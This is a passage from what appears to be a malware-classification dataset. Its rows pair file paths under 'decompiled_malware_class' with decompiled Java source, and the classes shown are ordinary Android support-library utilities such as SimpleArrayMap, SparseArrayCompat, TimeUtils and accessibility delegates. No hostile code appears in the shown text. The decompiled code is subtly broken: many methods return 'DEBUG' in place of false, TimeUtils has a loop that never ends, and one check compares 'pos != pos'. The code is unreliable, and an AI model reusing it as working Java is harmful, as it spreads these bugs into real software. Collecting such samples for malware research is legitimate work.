if (i3 < this.mSize) {       System.arraycopy(this.mHashes,i3,this.mHashes,i3 + 1,this.mSize - i3);       System.arraycopy(this.mArray,i3 << 1,this.mArray,(i3 + 1) << 1,(this.mSize - i3) << 1);     }     this.mHashes[i3]=hashCode;     this.mArray[i3 << 1]=k;     this.mArray[(i3 << 1) + 1]=v;     this.mSize++;     return null;   }   public void putAll(  SimpleArrayMap<? extends K,? extends V> array){     int N=array.mSize;     ensureCapacity(this.mSize + N);     if (this.mSize == 0) {       if (N > 0) {         System.arraycopy(array.mHashes,0,this.mHashes,0,N);         System.arraycopy(array.mArray,0,this.mArray,0,N << 1);         this.mSize=N;         return;       }       return;     }     for (int i=0; i < N; i++) {       put(array.keyAt(i),array.valueAt(i));     }   }   public V remove(  Object key){     int index=key == null ? indexOfNull() : indexOf(key,key.hashCode());     if (index >= 0) {       return removeAt(index);     }     return null;   }   public V removeAt(  int i){     V v=(V)this.mArray[(i << 1) + 1];     if (this.mSize <= 1) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }  else     if (this.mHashes.length > 8 && this.mSize < this.mHashes.length / 3) {       int i2=this.mSize > 8 ? this.mSize + (this.mSize >> 1) : 8;       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i2);       this.mSize--;       if (i > 0) {         System.arraycopy(iArr,0,this.mHashes,0,i);         System.arraycopy(objArr,0,this.mArray,0,i << 1);       }       if (i < this.mSize) {         System.arraycopy(iArr,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(objArr,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }     }  else {       this.mSize--;       if (i < this.mSize) {         System.arraycopy(this.mHashes,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(this.mArray,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }       this.mArray[this.mSize << 1]=null;       this.mArray[(this.mSize << 1) + 1]=null;     }     return v;   }   public int size(){     return this.mSize;   }   public boolean equals(  Object object){     if (this == object) {       return true;     }     if (!(object instanceof Map)) {       return DEBUG;     }     Map<?,?> map=(Map)object;     if (size() != map.size()) {       return DEBUG;     }     for (int i=0; i < this.mSize; i++) {       try {         K key=keyAt(i);         V mine=valueAt(i);         Object theirs=map.get(key);         if (mine == null) {           if (theirs != null || !map.containsKey(key)) {             return DEBUG;           }         }  else         if (!mine.equals(theirs)) {           return DEBUG;         }       }  catch (      ClassCastException e) {         return DEBUG;       } catch (      NullPointerException e2) {         return DEBUG;       }     }     return true;   }   public int hashCode(){     int[] hashes=this.mHashes;     Object[] array=this.mArray;     int result=0;     int i=0;     int v=1;     int s=this.mSize;     while (i < s) {       Object value=array[v];       result+=(value == null ? 0 : value.hashCode()) ^ hashes[i];       i++;       v+=2;     }     return result;   }   public String toString(){     if (isEmpty()) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       Object key=keyAt(i);       if (key != this) {         buffer.append(key);       }  else {         buffer.append(""(this Map)"");       }       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\SparseArrayCompat.code","public class SparseArrayCompat<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private int[] mKeys;   private int mSize;   private Object[] mValues;   public SparseArrayCompat(){     this(10);   }   public SparseArrayCompat(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_INTS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealIntArraySize(initialCapacity);       this.mKeys=new int[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public SparseArrayCompat<E> m1clone(){     SparseArrayCompat<E> clone=null;     try {       clone=(SparseArrayCompat)super.clone();       clone.mKeys=(int[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  int key){     return get(key,null);   }   public E get(  int i,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,i);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  int key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  int key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   public void removeAtRange(  int index,  int size){     int end=Math.min(this.mSize,index + size);     for (int i=index; i < end; i++) {       removeAt(i);     }   }   private void gc(){     int n=this.mSize;     int o=0;     int[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  int key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(this.mSize + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public int keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  int key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  int key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(pos + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       int key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\TimeUtils.code","public class TimeUtils {   public static final int HUNDRED_DAY_FIELD_LEN=19;   private static final int SECONDS_PER_DAY=86400;   private static final int SECONDS_PER_HOUR=3600;   private static final int SECONDS_PER_MINUTE=60;   private static final Object sFormatSync=new Object();   private static char[] sFormatStr=new char[24];   private static int accumField(  int amt,  int suffix,  boolean always,  int zeropad){     if (amt > 99 || (always && zeropad >= 3)) {       return suffix + 3;     }     if (amt > 9 || (always && zeropad >= 2)) {       return suffix + 2;     }     if (always || amt > 0) {       return suffix + 1;     }     return 0;   }   private static int printField(  char[] formatStr,  int amt,  char suffix,  int pos,  boolean always,  int zeropad){     if (always || amt > 0) {       if ((always && zeropad >= 3) || amt > 99) {         int dig=amt / 100;         formatStr[pos]=(char)(dig + 48);         pos++;         amt-=dig * 100;       }       if ((always && zeropad >= 2) || amt > 9 || pos != pos) {         int dig2=amt / 10;         formatStr[pos]=(char)(dig2 + 48);         pos++;         amt-=dig2 * 10;       }       formatStr[pos]=(char)(amt + 48);       int pos2=pos + 1;       formatStr[pos2]=suffix;       return pos2 + 1;     }     return pos;   }   private static int formatDurationLocked(  long duration,  int fieldLen){     char prefix;     if (sFormatStr.length < fieldLen) {       sFormatStr=new char[fieldLen];     }     char[] formatStr=sFormatStr;     if (duration == 0) {       int fieldLen2=fieldLen - 1;       while (0 < fieldLen2) {         formatStr[0]=' ';       }       formatStr[0]='0';       return 1;     }     if (duration > 0) {       prefix='+';     }  else {       prefix='-';       duration=-duration;     }     int millis=(int)(duration % 1000);     int seconds=(int)Math.floor(duration / 1000);     int days=0;     int hours=0;     int minutes=0;     if (seconds > SECONDS_PER_DAY) {       days=seconds / SECONDS_PER_DAY;       seconds-=SECONDS_PER_DAY * days;     }     if (seconds > SECONDS_PER_HOUR) {       hours=seconds / SECONDS_PER_HOUR;       seconds-=hours * SECONDS_PER_HOUR;     }     if (seconds > SECONDS_PER_MINUTE) {       minutes=seconds / SECONDS_PER_MINUTE;       seconds-=minutes * SECONDS_PER_MINUTE;     }     int pos=0;     if (fieldLen != 0) {       int myLen=accumField(days,1,false,0);       int myLen2=myLen + accumField(hours,1,myLen > 0,2);       int myLen3=myLen2 + accumField(minutes,1,myLen2 > 0,2);       int myLen4=myLen3 + accumField(seconds,1,myLen3 > 0,2);       for (int myLen5=myLen4 + accumField(millis,2,true,myLen4 > 0 ? 3 : 0) + 1; myLen5 < fieldLen; myLen5++) {         formatStr[pos]=' ';         pos++;       }     }     formatStr[pos]=prefix;     int pos2=pos + 1;     boolean zeropad=fieldLen != 0;     int pos3=printField(formatStr,days,'d',pos2,false,0);     int pos4=printField(formatStr,hours,'h',pos3,pos3 != pos2,zeropad ? 2 : 0);     int pos5=printField(formatStr,minutes,'m',pos4,pos4 != pos2,zeropad ? 2 : 0);     int pos6=printField(formatStr,seconds,'s',pos5,pos5 != pos2,zeropad ? 2 : 0);     int pos7=printField(formatStr,millis,'m',pos6,true,(!zeropad || pos6 == pos2) ? 0 : 3);     formatStr[pos7]='s';     return pos7 + 1;   }   public static void formatDuration(  long duration,  StringBuilder builder){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,0);       builder.append(sFormatStr,0,len);     }   }   public static void formatDuration(  long duration,  PrintWriter pw,  int fieldLen){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,fieldLen);       pw.print(new String(sFormatStr,0,len));     }   }   public static void formatDuration(  long duration,  PrintWriter pw){     formatDuration(duration,pw,0);   }   public static void formatDuration(  long time,  long now,  PrintWriter pw){     if (time == 0) {       pw.print(""--"");     }  else {       formatDuration(time - now,pw,0);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\ValuesCollection.code","final class ValuesCollection implements Collection<V> {   ValuesCollection(){   }   @Override public boolean add(  V object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends V> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfValue(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<V> iterator(){     return new ArrayIterator(1);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfValue(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public boolean retainAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (!collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(1);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,1);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat listener){       return null;     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return false;     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return true;     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return false;     }   } static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }       } );     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);     }   } static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }         @Override public Object getAccessibilityNodeProvider(        View host){           AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);           if (provider != null) {             return provider.getProvider();           }           return null;         }         @Override public boolean performAccessibilityAction(        View host,        int action,        Bundle args){           return compat.performAccessibilityAction(host,action,args);         }       } );     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);       if (provider != null) {         return new AccessibilityNodeProviderCompat(provider);       }       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public Object getBridge(){     return this.mBridge;   }   public void sendAccessibilityEvent(  View host,  int eventType){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,host,eventType);   }   public void sendAccessibilityEventUnchecked(  View host,  AccessibilityEvent event){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,host,event);   }   public boolean dispatchPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,host,info);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,host,child,event);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View host){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,host);   }   public boolean performAccessibilityAction(  View host,  int action,  Bundle args){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,host,action,args);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(host,event);       }     } ;   }   public static boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).dispatchPopulateAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  Object info){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityNodeInfo(host,(AccessibilityNodeInfo)info);   }   public static void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onPopulateAccessibilityEvent(host,event);   }   public static boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).onRequestSendAccessibilityEvent(host,child,event);   }   public static void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEvent(host,eventType);   }   public static void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEventUnchecked(host,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return 